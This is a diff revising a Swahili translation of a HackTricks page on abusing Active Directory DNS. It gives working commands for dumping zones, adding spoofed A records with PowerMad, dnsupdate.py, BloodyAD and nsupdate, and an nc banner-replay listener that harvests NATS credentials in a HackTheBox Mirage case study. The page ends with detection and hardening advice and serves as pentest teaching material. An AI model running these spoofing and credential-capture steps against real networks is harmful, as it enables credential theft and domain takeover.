@@ -1,10 +1,10 @@
-# AD DNS Records
+# Rekodi za AD DNS
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Kwa kawaida **mtumiaji yeyote** katika Active Directory anaweza **enumerate all DNS records** katika Domain au Forest DNS zones, sawa na a zone transfer (watumiaji wanaweza kuorodhesha child objects za DNS zone katika AD environment).
+Kwa chaguo-msingi, **mtumiaji yeyote** katika Active Directory anaweza **kuorodhesha rekodi zote za DNS** katika maeneo ya DNS ya Domain au Forest, sawa na zone transfer (watumiaji wanaweza kuorodhesha child objects za eneo la DNS katika mazingira ya AD).
 
-Chombo [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) kinawawezesha **enumeration** na **exporting** ya **all DNS records** kwenye zone kwa madhumuni ya recon ya mitandao ya ndani.
+Zana ya [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) huwezesha **kuorodhesha** na **kuhamisha** **rekodi zote za DNS** katika eneo hilo kwa madhumuni ya recon ya mitandao ya ndani.<sup>[[4]](#references)</sup>
 ```bash
 git clone https://github.com/dirkjanm/adidnsdump
 cd adidnsdump
@@ -21,15 +21,15 @@ adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.loca
 
 cat records.csv
 ```
->  adidnsdump v1.4.0 (April 2025) inaongeza output ya JSON/Greppable (`--json`), utatuzi wa DNS wa multi-threaded na msaada kwa TLS 1.2/1.3 wakati wa ku-binding kwa LDAPS
+>  adidnsdump v1.4.0 (April 2025) inaongeza JSON/Greppable (`--json`) output, utatuzi wa DNS wa multi-threaded na support ya TLS 1.2/1.3 wakati wa kujiunga na LDAPS
 
-For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+Kwa maelezo zaidi soma [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>
 
 ---
 
-## Kuunda / Kubadilisha records (ADIDNS spoofing)
+## Kuunda / Kurekebisha records (ADIDNS spoofing)
 
-Kwa sababu kikundi cha **Authenticated Users** kimepewa **Create Child** kwenye zone DACL kwa chaguo-msingi, akaunti yoyote ya domain (au akaunti ya kompyuta) inaweza kusajili rekodi za ziada. Hii inaweza kutumiwa kunyang'anya trafiki, NTLM relay coercion au hata kuvamiwa kabisa kwa domain.
+Kwa sababu kundi la **Authenticated Users** lina ruhusa ya **Create Child** kwenye zone DACL kwa default, account yoyote ya domain (au computer account) inaweza kusajili records za ziada. Hii inaweza kutumiwa kwa traffic hijacking, NTLM relay coercion au hata full domain compromise.
 
 ### PowerMad / Invoke-DNSUpdate (PowerShell)
 ```powershell
@@ -46,7 +46,7 @@ Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
 # add/replace an A record via secure dynamic-update
 python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
 ```
-(dnsupdate.py huja na Impacket ≥0.12.0)
+*(dnsupdate.py inakuja pamoja na Impacket ≥0.12.0)*
 
 ### BloodyAD
 ```bash
@@ -54,21 +54,21 @@ bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.
 ```
 ---
 
-## Common attack primitives
+## Mbinu za kawaida za mashambulizi
 
-1. **Wildcard record** – `*.<zone>` hubadilisha AD DNS server kuwa responder wa kampuni nzima, sawa na LLMNR/NBNS spoofing. Inaweza kutumika kukamata NTLM hashes au kuzi- relay kwenda LDAP/SMB.  (Requires WINS-lookup to be disabled.)
-2. **WPAD hijack** – ongeza `wpad` (au rekodi ya **NS** inayorejelea mwenyeji wa mdukuzi ili kupitisha Global-Query-Block-List) na kupitia kwa uwazi fanya proxy kwa maombi ya HTTP yanayotoka ili kukusanya credentials. Microsoft ilirekebisha wildcard/ DNAME bypasses (CVE-2018-8320) lakini **NS-records still work**.
-3. **Stale entry takeover** – dai anwani ya IP ambayo awali ilimilikiwa na workstation na rekodi ya DNS inayohusiana bado itaendelea kutatua, ikiruhusu resource-based constrained delegation au Shadow-Credentials attacks bila kugusa DNS kabisa.
-4. **DHCP → DNS spoofing** – kwenye deployment ya default ya Windows DHCP+DNS mdukuzi asiye-thibitishwa kwenye subnet hiyo hiyo anaweza kuandika upya rekodi yoyote ya A (ikiwa ni pamoja na Domain Controllers) kwa kutuma DHCP requests zilizodanganywa zinazochochea dynamic DNS updates (Akamai “DDSpoof”, 2023). Hii inatoa machine-in-the-middle juu ya Kerberos/LDAP na inaweza kusababisha full domain takeover.
-5. **Certifried (CVE-2022-26923)** – badilisha `dNSHostName` ya account ya mashine unayodhibiti, jisajili rekodi ya A inayolingana, kisha omba certificate kwa jina hilo kuiga DC. Zana kama **Certipy** au **BloodyAD** zinafanya mchakato mzima kwa automatiska.
+1. **Wildcard record** – `*.<zone>` hugeuza AD DNS server kuwa responder wa kiwango cha kampuni nzima, sawa na LLMNR/NBNS spoofing. Inaweza kutumiwa kukusanya NTLM hashes au kuzi-relay kwa LDAP/SMB.  (Inahitaji WINS-lookup izimwe.)<sup>[[1]](#references)</sup>
+2. **WPAD hijack** – ongeza `wpad` (au **NS** record inayoelekeza kwenye attacker host ili kupita Global-Query-Block-List) na utumie proxy kwa uwazi kwenye HTTP requests zinazotoka ili kuvuna credentials. Microsoft ilirekebisha wildcard/ DNAME bypasses (CVE-2018-8320), lakini **NS-records bado zinafanya kazi**.<sup>[[1]](#references)</sup>
+3. **Stale entry takeover** – dai IP address iliyokuwa ya workstation hapo awali, na DNS entry inayohusishwa nayo itaendelea kutatua, hivyo kuwezesha resource-based constrained delegation au Shadow-Credentials attacks bila kugusa DNS kabisa.
+4. **DHCP → DNS spoofing** – kwenye deployment chaguomsingi ya Windows DHCP+DNS, attacker asiye na authentication kwenye subnet hiyo hiyo anaweza kuandika upya A record yoyote iliyopo (ikiwemo ya Domain Controllers) kwa kutuma forged DHCP requests zinazosababisha dynamic DNS updates (Akamai “DDSpoof”, 2023).  Hii hutoa machine-in-the-middle dhidi ya Kerberos/LDAP na inaweza kusababisha full domain takeover.<sup>[[2]](#references)</sup>
+5. **Certifried (CVE-2022-26923)** – badilisha `dNSHostName` ya machine account unayoidhibiti, sajili matching A record, kisha omba certificate kwa jina hilo ili kujifanya DC. Tools kama **Certipy** au **BloodyAD** hu-automate mtiririko mzima.
 
 ---
 
-### Kunyakua huduma za ndani kupitia rekodi za dynamic zilizobaki (somo la kesi ya NATS)
+### Internal service hijacking kupitia stale dynamic records (NATS case study)
 
-Wakati dynamic updates zinabaki wazi kwa watumiaji wote walio-thibitishwa, **jina la huduma lililofutwa linaweza kudaiwa tena na kuelekezwa kwa miundombinu ya mdukuzi**. The Mirage HTB DC ilifunua hostname `nats-svc.mirage.htb` baada ya DNS scavenging, hivyo mtumiaji yeyote mwenye ruhusa ndogo angeweza:
+Dynamic updates zinapoachwa wazi kwa users wote walio-authenticate, **jina la service lililoondolewa kwenye usajili linaweza kudaiwa tena na kuelekezwa kwenye attacker infrastructure**. Mirage HTB DC ilifichua hostname `nats-svc.mirage.htb` baada ya DNS scavenging, hivyo user yeyote mwenye privileges ndogo angeweza:<sup>[[3]](#references)</sup>
 
-1. **Thibitisha kuwa rekodi haipo** na jifunze SOA kwa kutumia `dig`:
+1. **Thibitisha kuwa record haipo** na ujifunze SOA kwa kutumia `dig`:
 ```bash
 dig @dc01.mirage.htb nats-svc.mirage.htb
 ```
@@ -79,30 +79,32 @@ nsupdate
 > update add nats-svc.mirage.htb 300 A 10.10.14.2
 > send
 ```
-3. **Impersonate the plaintext service**. Wateja wa NATS wanatarajia kuona bango moja `INFO { ... }` kabla ya kutuma credentials, hivyo kunakili bango halali kutoka kwa broker halisi kunatosha kuvuna siri:
+3. **Jifanya kuwa huduma ya plaintext**. Clients wa NATS wanatarajia kuona banner moja ya `INFO { ... }` kabla ya kutuma credentials, hivyo kunakili banner halali kutoka kwa broker halisi kunatosha kuvuna secrets:
 ```bash
 # Capture a single INFO line from the real service and replay it to victims
 nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
 ```
-Kila mteja anayetatua jina lililotekwa ata leak mara moja fremu yake ya JSON `CONNECT` (ikiwa ni pamoja na `"user"`/`"pass"`) kwa listener. Kuendesha binary rasmi `nats-server -V` kwenye mwenyeji wa mshambuliaji, kuzima redaction ya log yake, au tu kusnifa kikao kwa kutumia Wireshark kunatoa nywila sawa za maandishi wazi (plaintext) kwa sababu TLS ilikuwa hiari.
+Mteja yeyote anayeresolve jina lililotekwa nyara ata-leak mara moja frame yake ya JSON `CONNECT` (ikiwemo `"user"`/`"pass"`) kwa listener. Kuendesha binary rasmi ya `nats-server -V` kwenye host ya mshambuliaji, kuzima log redaction yake, au kunasa session tu kwa Wireshark hutoa credentials zilezile za plaintext kwa sababu TLS ilikuwa optional.
 
-4. **Pivot with the captured creds** – Katika Mirage, akaunti ya NATS iliyotekwa ilitoa JetStream access, ambayo ilifichua matukio ya kihistoria ya authentication yaliyo na reusable AD usernames/passwords.
+4. **Pivot with the captured creds** – katika Mirage, akaunti ya NATS iliyoibwa ilitoa ufikiaji wa JetStream, ambao ulifichua authentication events za zamani zenye usernames/passwords za AD zinazoweza kutumika tena.
 
-This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): mara rekodi ya DNS ikitekwa, mshambuliaji anakuwa huduma hiyo.
+Pattern hii inatumika kwa kila service iliyounganishwa na AD inayotegemea unsecured TCP handshakes (HTTP APIs, RPC, MQTT, n.k.): mara DNS record inapotekwa nyara, mshambuliaji anakuwa service yenyewe.
 
 ---
 
-## Ugundaji & Kuimarisha
+## Detection & hardening
 
-* Kataa kwa **Authenticated Users** haki ya *Create all child objects* kwenye zones nyeti na ruhusu dynamic updates kufanywa na akaunti maalum inayotumika na DHCP.
-* Ikiwa dynamic updates zinahitajika, weka zone kuwa **Secure-only** na wezesha **Name Protection** katika DHCP ili tu owner computer object aweze kuandika rekodi yake tena.
-* Fuatilia DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) na maandishi ya LDAP kwa `CN=MicrosoftDNS,DC=DomainDnsZones`.
-* Zuia majina hatari (`wpad`, `isatap`, `*`) kwa kutumia rekodi ya makusudi isiyo hatari au kupitia Global Query Block List.
-* Hakikisha DNS servers zimesasishwa (patched) – kwa mfano, RCE bugs CVE-2024-26224 na CVE-2024-26231 zilifikia **CVSS 9.8** na zinaweza kutumiwa kwa mbali dhidi ya Domain Controllers.
+* Nyima **Authenticated Users** haki ya *Create all child objects* kwenye zones nyeti na delegate dynamic updates kwa account maalum inayotumiwa na DHCP.
+* Ikiwa dynamic updates zinahitajika, weka zone kuwa **Secure-only** na enable **Name Protection** kwenye DHCP ili computer object ya owner pekee iweze overwrite record yake yenyewe.
+* Fuatilia DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer), pamoja na LDAP writes kwenda `CN=MicrosoftDNS,DC=DomainDnsZones`.
+* Block dangerous names (`wpad`, `isatap`, `*`) kwa record iliyokusudiwa kuwa benign au kupitia Global Query Block List.
+* Weka DNS servers zikiwa patched – kwa mfano, RCE bugs CVE-2024-26224 na CVE-2024-26231 zilifikia **CVSS 9.8** na zinaweza ku-exploitwa remotely dhidi ya Domain Controllers.
 
-## Marejeo
+## References
 
-- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, bado rejea ya msingi kwa mashambulizi ya wildcard/WPAD)
-- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
-- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
+- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, bado ni de-facto reference ya wildcard/WPAD attacks)
+- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
+- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
+- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+
 {{#include ../../banners/hacktricks-training.md}}
